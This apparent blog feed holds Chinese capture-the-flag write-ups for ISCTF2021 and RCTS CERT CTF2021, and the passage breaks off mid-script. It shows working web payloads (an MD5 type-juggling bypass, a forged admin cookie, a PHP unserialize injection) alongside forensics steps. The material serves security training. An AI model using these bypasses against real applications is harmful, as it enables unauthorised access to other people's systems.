alt="image-20211031102243174"></p><p>密码是173572</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/102302-586704.png" alt="image-20211031102300738"></p><p>ISCTF{b3d3b0eO-ccfd-4d7b-be78-0ab81da3d334}</p><h1 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h1><h2 id="KNN"><a href="#KNN" class="headerlink" title="KNN"></a>KNN</h2><p>出题人：Marcher</p><p>学校：大理大学</p><p>题目描述：一种简单的算法</p><p>包裹ISCTF{}后提交</p><p>knn，大一python的实验项目，跑机器学习的，用来分类数据，找到之前写的分类水果的脚本，改一下。</p><p>用不了，水果是三维的这题需要重写一个脚本，直接去csdn找代码：</p><p><a href="https://blog.csdn.net/weixin_30846599/article/details/97486168">https://blog.csdn.net/weixin_30846599/article/details/97486168</a></p><p><a href="https://blog.csdn.net/cqulun123/article/details/80217558">https://blog.csdn.net/cqulun123/article/details/80217558</a></p><p>修改一下他的测试训练集的代码。：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash">def createdataset():<br>        group = array([<br>                        [0, 0],[0, 0.5],[0, 1],<br>                        [1.0, 1.1], [1.0, 1.5],[1.0, 2.0],<br>                        [2.0,2.0],[2.0,2.5],[2.0,3.0],<br>                        [3.0,3.0],[3.0,3.5],[3.0,4.0],<br>                        [4.0,4.0],[4.0,4.5],[4.0,5.0],<br>                        [5.0,5.0],[5.0,5.5],[5.0,6.0],<br>                        [6.0,6.0],[6.0,6.5],[6.0,7.0],<br>                        [7.0,7.0],[7.0,7.5],[7.0,8.0],<br>                        [8.0,8.0],[8.0,8.5],[8.0,9.0],<br>                        [9.0,9.0],[9.0,9.5],[9.0,10.0],<br>                        [10.0,10.0],[10.0,10.5],[10.0,11.0],<br>                        [11.0,11.0],[11.0,11.5],[11.0,12.0],<br>                        [12.0,12.0],[12.0,12.5],[12.0,13.0],<br>                        [13.0,13.0],[13.0,13.5],[13.0,14.0],<br>                        [14.0,14.0],[14.0,14.5],[14.0,15.0],<br>                        [15.0,15.0],[15.0,15.5],[15.0,16.0],<br>                        [16.0,16.0],[16.0,16.5],[16.0,17.0],<br>                        [17.0,17.0],[17.0,17.5],[17.0,18.0],<br>                        [18.0,18.0],[18.0,18.5],[18.0,19.0],<br>                        [19.0,19.0],[19.0,19.5],[19.0,20.0],<br>                        [20.0,20.0],[20.0,20.5],[20.0,21.0],<br>                        [21.0,21.0],[21.0,21.5],[21.0,22.0],<br>                        [22.0,22.0]])<br>        labels = [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>,<span class="hljs-string">&#x27;@&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;~&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>,<span class="hljs-string">&#x27;6&#x27;</span>,<span class="hljs-string">&#x27;7&#x27;</span>,<span class="hljs-string">&#x27;8&#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>]<br>        <span class="hljs-built_in">return</span> group, labels<br>def KNN_run(inx, data_set, labels, k):<br>        data_set_size = data_set.shape[0] <br>        diff_mat = tile(inx, (data_set_size, 1)) - data_set<br>        sq_diff_mat = diff_mat**2<br>        sq_distances = sq_diff_mat.sum(axis=1)<br>        distances = sq_distances**0.5<br>        orted_dist_indicies = distances.argsort()<br>        class_count = &#123;&#125; <br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(k):<br>                vote_label = labels[orted_dist_indicies[i]]  <br>                class_count[vote_label] = class_count.get(vote_label, 0) + 1<br>        sorted_class_count = sorted(class_count.items(),<br>key=operator.itemgetter(1), reverse=True)<br>        <span class="hljs-built_in">return</span> sorted_class_count[0][0]<br><br><span class="hljs-comment">#data=[[20,13],[9,5],[47,73],[11,54],[36,34],[90,60],[69,26],[69,59],[8,75],[44,18],[18,90],[68,71],[37,88],[16,21],[58,9],[96,77],[35,54],[23,33],[97,77],[76,47],[67,16],[28,13],[1,93],[45,12],[66,87],[15,74],[28,39],[99,1],[82,17],[99,42],[17,46],[75,21],[42,24],[97,15],[60,27],[60,35],[70,75],[18,89],[65,74],[73,30],[47,13],[93,39],[25,63]]</span><br><span class="hljs-comment">#K=5</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    group, labels = createdataset()<br>    data = [[20,13],[9,5],[47,73],[11,54],[36,34],[90,60],[69,26],[69,59],[8,75],[44,18],[18,90],[68,71],[37,88],[16,21],[58,9],[96,77],[35,54],[23,33],[97,77],[76,47],[67,16],[28,13],[1,93],[45,12],[66,87],[15,74],[28,39],[99,1],[82,17],[99,42],[17,46],[75,21],[42,24],[97,15],[60,27],[60,35],[70,75],[18,89],[65,74],[73,30],[47,13],[93,39],[25,63]]<br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    test_class = KNN_run(i, group, labels, 5)<br>    <span class="hljs-built_in">print</span>(test_class,end=<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>flag：ISCTF{zk09000090900~00000007900900009000000900000}</p><h1 id="问卷题"><a href="#问卷题" class="headerlink" title="问卷题"></a>问卷题</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;Thank_U_4_Participating_ISCTF2021_AnD_C_U_Next_Ye@r&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;Misc签到&quot;&gt;&lt;a href=&quot;#Misc签到&quot; class=&quot;headerlink&quot; title=&quot;Misc签</summary>
      
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>RCTS CERT CTF2021</title>
    <link href="https://swhat.github.io/2021/08/13/RCTS-CERT-CTF2021/"/>
    <id>https://swhat.github.io/2021/08/13/RCTS-CERT-CTF2021/</id>
    <published>2021-08-13T07:44:29.000Z</published>
    <updated>2021-08-15T03:59:06.488Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Some-type-of-juggling"><a href="#Some-type-of-juggling" class="headerlink" title="Some type of juggling"></a>Some type of juggling</h2><p><strong>#web#php</strong><br>Can you solve this challenge?<br>URL:<a href="http://challenges.defsoc.tk:8080/">http://challenges.defsoc.tk:8080</a><br>Flag format: flag{string}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>        highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;240610708&quot;</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>] === <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;It is not THAT easy!&#x27;</span>);<br>            &#125; <br>            <span class="hljs-variable">$hash</span> = md5(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;hash&#x27;</span>]);<br>            <span class="hljs-variable">$key</span> = md5(<span class="hljs-variable">$value</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hash</span> == <span class="hljs-variable">$key</span>) &#123;<br>                <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Congratulations! Your flag is: <span class="hljs-subst">$flag</span>&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Flag not found!&quot;</span>;<br>            &#125;<br>        &#125; <br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>md5后的结果要一样，可以用0e绕过，而且hash与value之间的关系是弱等，所以hash不能是数字。var_dump(md5(‘240610708’) == md5(‘QNKCDZO’));<br> 解题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?hash=QNKCDZO<br>Congratulations! Your flag is: flag&#123;php_typ3_juggl1ng_1s_c00l&#125;<br></code></pre></td></tr></table></figure><h2 id="Exclusive-access"><a href="#Exclusive-access" class="headerlink" title="Exclusive access"></a>Exclusive access</h2><p><strong>#web#owasp10</strong><br>We discovered a protected page. Can you bypass it?<br>URL:<a href="http://challenges.defsoc.tk:9999/">http://challenges.defsoc.tk:9999</a><br>Flag format: flag{string}</p><p> 抓包得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Cookie: user_type=Z3Vlc3Q%<span class="hljs-number">3</span>D<br></code></pre></td></tr></table></figure><p>url解码再base64解码得到guest，将admin逆操作得到YWRtaW4%3D，传过去得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;br0k3n_auth3nt1c4t10n&#125;<br></code></pre></td></tr></table></figure><h2 id="It-is-Magic-after-all"><a href="#It-is-Magic-after-all" class="headerlink" title="It is Magic after all"></a>It is Magic after all</h2><p><strong>#web#php</strong><br>Can you do some magic in this page?<br>URL:<a href="http://challenges.defsoc.tk:3000/">http://challenges.defsoc.tk:3000</a><br>Flag format: flag{string}<br>​</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;  <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Magic</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doMagic</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;key === <span class="hljs-literal">true</span>) &#123;<br>          <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nothing...&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magic&#x27;</span>])) &#123;  <br>    <span class="hljs-variable">$magic</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magic&#x27;</span>]); <br>    <span class="hljs-variable">$magic</span>-&gt;doMagic();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Nothing...&quot;</span>;<br>&#125;  <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Magic</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Magic();<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?magic=O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Magic&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;key&quot;</span>;b:<span class="hljs-number">1</span>;&#125;<br><span class="hljs-comment">#flag&#123;php_d3s3r14l1z4t10n_3xpl01ts&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Hiding-in-plain-sight"><a href="#Hiding-in-plain-sight" class="headerlink" title="Hiding in plain sight"></a>Hiding in plain sight</h2><p><strong>#forensi#images</strong><br>I think there is something fishy about this image.<br>Can you help me out?<br>Flag format: flag{string}<br>​</p><p>010文件尾就是flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;h1dd3n_t3xt_1n_pl41ns1ght&#125;<br></code></pre></td></tr></table></figure><h2 id="Welcome-to-the-challenge"><a href="#Welcome-to-the-challenge" class="headerlink" title="Welcome to the challenge"></a>Welcome to the challenge</h2><p><strong>#forensics#images</strong><br>Welcome to the RCTS Challenge!<br>Can you find the flag?<br>Flag format: flag{string}<br>​</p><p>直接foremost分离图片</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">flag&#123;<span class="hljs-number">0</span>n3_1m4g3_1s_n0t_3n0ugh&#125;<br></code></pre></td></tr></table></figure><h2 id="About-us"><a href="#About-us" class="headerlink" title="About us"></a>About us</h2><p><strong>#forensics#pdfs</strong><br>This challenge is about the RCTS CERT at FCCN.<br>Can you get the flag?<br>Flag format: flag{string}<br>​</p><p>strings查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ strings RCTSCERT-FCCN.pdf |grep flag                                                                                                      139 ⨯<br>  &lt;pdfx:Flag&gt;flag&#123;4b0ut_us_4t_rcts_c3rt&#125;&lt;/pdfx:Flag&gt;<br></code></pre></td></tr></table></figure><h2 id="Keyp-it-universal"><a href="#Keyp-it-universal" class="headerlink" title="Keyp it universal"></a>Keyp it universal</h2><p><strong>#foren#pcap</strong><br>We intercepted a strange communication which we believe has important information inside.<br>Can you retrieve the information from it?<br>Flag format: flag{string}<br>Regex: flag{[0-9a-z_]+}<br>​</p><p>USB键盘流量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">tshark -r capture.pcap -T fields -e usb.capdata &gt; usbdata.txt<br><br>tshark -r capture.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p>加冒号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> len(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量len=16，鼠标流量len=8</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,len(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != len(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br><br></code></pre></td></tr></table></figure><p>keyborad.py</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs php">normalKeys = &#123;<br>    <span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>    <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>     <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>      <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>       <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>        <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>         <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>         <span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<br>         <span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<br>         <span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>         <span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span 